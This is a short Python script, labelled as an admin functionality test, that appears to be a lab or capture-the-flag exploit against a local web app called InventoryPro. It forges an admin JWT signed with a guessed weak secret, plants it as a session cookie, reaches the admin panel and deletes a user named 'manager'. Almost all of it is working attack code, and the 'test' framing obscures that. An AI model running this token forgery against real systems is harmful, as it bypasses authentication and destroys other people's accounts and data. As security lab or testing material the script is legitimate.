import requests
import jwt
from datetime import datetime, timedelta

def test_admin_functionality():
    print("🔍 Testing InventoryPro admin functionality...")
    
    # Create forged admin token
    payload = {
        "iss": "inventorymanager",
        "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
        "sub": "admin",
        "role": "admin",
        "kid": "test-kid"
    }
    
    weak_secret = "admin123"
    forged_token = jwt.encode(payload, weak_secret, algorithm="HS256")
    print(f"✅ Forged admin token created")
    
    # Test admin panel access
    admin_session = requests.Session()
    admin_session.cookies.set('session', forged_token)
    
    response = admin_session.get('http://localhost:3206/admin')
    if response.status_code == 200:
        print("✅ Admin panel accessible with forged token")
        
        # Test user deletion
        delete_response = admin_session.get('http://localhost:3206/admin/delete?username=manager')
        if delete_response.status_code == 200:
            result = delete_response.json()
            if "success" in result:
                print(f"✅ User deletion successful: {result['success']}")
                print(f"   Deleted user info: {result.get('deleted_user', {})}")
            else:
                print(f"❌ User deletion failed: {result}")
        else:
            print(f"❌ User deletion request failed: {delete_response.status_code}")
            
        # Verify user is deleted by checking admin panel again
        admin_response2 = admin_session.get('http://localhost:3206/admin')
        if admin_response2.status_code == 200:
            if "manager" not in admin_response2.text:
                print("✅ User successfully removed from user list")
            else:
                print("⚠️  User still appears in admin panel")
                
    else:
        print(f"❌ Admin panel access failed: {response.status_code}")
    
    print("\n🎯 Admin functionality test completed!")

if __name__ == "__main__":
    test_admin_functionality()
